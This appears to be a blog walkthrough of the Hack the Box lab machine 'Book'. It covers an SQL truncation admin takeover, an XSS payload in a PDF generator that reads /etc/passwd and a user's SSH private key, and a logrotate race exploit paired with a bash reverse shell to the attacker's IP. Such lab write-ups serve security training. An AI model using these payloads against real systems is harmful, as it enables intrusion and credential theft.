+++
author = "Nick"
categories = ["hack the box", "XSS", "sql truncation", "log rotate", "pdf", "burpsuite", "LFI", "reverse shell"]
date = 2020-07-11T15:00:00Z
description = ""
draft = false
thumbnail = "/images/2020/03/info.png"
slug = "hack-the-box-book"
summary = "Welcome back! Today we will be doing a walkthrough of the Hack the Box machine, Book. This is a Linux machine with a medium difficulty. Let's jump in!"
tags = ["hack the box", "XSS", "sql truncation", "log rotate", "pdf", "burpsuite", "LFI", "reverse shell"]
title = "Hack the Box - Book"

+++


Welcome back! Today we will be doing a walkthrough of the Hack the Box machine, Book. This is a Linux machine with a medium difficulty. Let's jump in!

As usual, we start with our `nmap` scan: `nmap -sC -sV -p- -oA all_scan 10.10.10.176`.

Here are our results:
```
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Pretty small selection. Looks like our path forward is some type of web exploit. We head over to the site to see what is being hosted. We're greeted with a sign in page.

![](/images/2020/03/image.png)

We'll start some manual inspection of the page while we load up `Burpsuite` and `Gobuster`.

Command:
`gobuster dir -u http://10.10.10.176 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40`

Here are our results:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.176
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/02 10:49:55 Starting gobuster
===============================================================
/docs (Status: 301)
/admin (Status: 301)
/images (Status: 301)
/server-status (Status: 403)
===============================================================
2020/03/02 10:55:06 Finished
===============================================================
```

While that runs we will create an account on the site and attempt to login. Sure enough, that does function.

![](/images/2020/03/image-1.png)

We are logged in as our account and start to enumerate futher. We see the page ends with `.php`. So we can pass some sessionID's to `Gobuster` and enumerate a bit more. We snag the `PHPSESSID` from Burp and feed it to `Gobuster`.

![](/images/2020/03/image-2.png)

Command:
`gobuster dir -u http://10.10.10.176 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40`

Here are the results:
```
===============================================================
2020/03/02 11:05:03 Starting gobuster
===============================================================
/contact.php (Status: 302)
/images (Status: 301)
/index.php (Status: 200)
/download.php (Status: 302)
/home.php (Status: 302)
/search.php (Status: 302)
/docs (Status: 301)
/profile.php (Status: 302)
/books.php (Status: 302)
/feedback.php (Status: 302)
/admin (Status: 301)
/db.php (Status: 200)
/logout.php (Status: 302)
/collections.php (Status: 302)
/settings.php (Status: 302)
/server-status (Status: 403)
```

While that runs we start manual enumeration. We see a php call to download a file.

![](/images/2020/03/image-3.png)

We might be able to leverage this as a potential SQL injection or maybe Directory Traversal. We also have a Book Submission form as well.

![](/images/2020/03/image-4.png)

We might be able to leverage this form by uploading something malicious. On the contact page we see a form that sends a message to admin@book.htb. Now we have a username as well as a domain to append to our hosts file. Our profile page also gives us the ability to update our name as well. Also on the book feedback page, we are able to seemingly send feedback to the admin.

![](/images/2020/03/image-5.png)

There seem to be quite a few good avenues forward, but which is the best? The standard access page or the admin page? We know that we want to access the Admin page. So what we will try is an [SQL Truncation Attack](https://resources.infosecinstitute.com/sql-truncation-attack/). First we will try and register our account as the admin account we found. So we register as `admin@book.htb` with our spaces on the end, up to the character limit of 20. Then we add some characters after that.

![](/images/2020/03/image-6.png)

In order to do with without `Burpsuite`, we need to modify the code on the email field to simply allow all text. So we inspect element and change our type from email to text.

![](/images/2020/03/image-7.png" caption="Before)

![](/images/2020/03/image-8.png" caption="After)

Now we can click submit. Then we head over to the admin portal and try to login as with the admin email password we just made.

![](/images/2020/03/image-9.png)

We're in! Now we look around the site and see some new areas. One for feedback, another for the collections and the messages that are sent from the user side. Now that we are in we are going to be looking to leverage some of the previous forms we found. With some luck they might have an XSS or reflection attack or something that we can leverage to gain a bit more access.

The first thing I attempted was to find and LFI. Maybe if I can just read some system contents I can have a better understanding of what we're dealing with. Nothing basic stood out, however, googling around lead me to this: https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html. Well, this is actually right up our alley! So we take this POC that attampts to read passwd file and put it into our title field. Fill out the author and submit it via our basic user account.

![](/images/2020/03/image-10.png)

Then back in our admin panel, we download the collection PDF. Sure enough, inside is the contents of passwd file!

![](/images/2020/03/image-11.png)

Sifting through the file we see we have a user `reader`. So now we're going to attempt to get the id_rsa file inside reader's home directory. We modify our injection slightly:

```js
<script>
x=new XMLHttpRequest; 
x.onload=function() { 
document.write(this.responseText) 
}; 
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
</script>
```

Then we upload that file as well, then check the PDF output.

![](/images/2020/03/image-12.png)

Awesome, now we have a key. However, copy / pasting the key from the PDF doesn't seem to work within Kali. When I opened the file in Chrome outside of my VM I was able to copy / paste that just fine. We save the file and attempt to SSH in with our new key.

![](/images/2020/03/image-13.png)

Now that we're in, let's snag the user.txt key and start to enumerate. We use 'wget' to download `LinEnum` or `LinPEAS` as well as `pspy`from our attacking machine and run it. We see some interesting items in the static enumeration. Such as book.timer calling other book functions. One thing that seems to catch my eye is when we are looking at the data via `pspy` we see this:

![](/images/2020/03/image-15.png)

This shows up quite a bit. So we google around for log rotate exploit and we come back with a few items but this in particular is appealing: [logrotten](https://github.com/whotwagner/logrotten). There is a good article here on how this exploit works: [feedyourhead](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition). 

So we need to have control of our path to use this exploit as well as some type of payload. When we look at the `backups` folder in our home directory we see we have full control of it and it's files. We also take a peek at the `logrotate.conf` file listed under `/etc/` to verify our permissions being set. Look's like we're in business!

![](/images/2020/03/image-16.png)

Looks like indeed root is the ID being set we double check it against the `wtmp` file just to be sure.

![](/images/2020/03/image-17.png)

Looks like we are in good shape. We have the ability to create our own payload. There are a few ways to go about that. The first is we can copy the root users SSH key to a temp file and then use that to SSH into the box. Alternatly we can create a payload with a NC reverse shell. The PoC gives us the code for a reverse shell so we'll use that same method.

First compile Logrotten.

Command:
`gcc -o logrotten logrotten.c`

Next create a payload.

Command:
`echo "bash -i >& /dev/tcp/10.10.14.196/4242 0>&1" > payload`

Now we copy the payload and logrotten to the target machine using `SimpleHTTPServer`.

![](/images/2020/03/image-18.png)

We'll then open a `netcat` listener.

Command:
`nc -lvnp 4242`

Now we need to set launch the exploit.

Command:
`./logrotten -p ./payloadfile /home/reader/backups/access.log`

Once this is running we will echo some content into the access.log file in order to initiate logrotate.

Command:
`echo '1212' > /home/reader/backups/access.log`

This will kick off the exploit and we will get a shell back!

![](/images/2020/03/book_root.gif)

We now have a root shell! We snag the flag and the box is done!

Think about sending me some respect over on HTB if you enjoyed the write-up! Here's my [profile](https://www.hackthebox.eu/home/users/profile/95635).



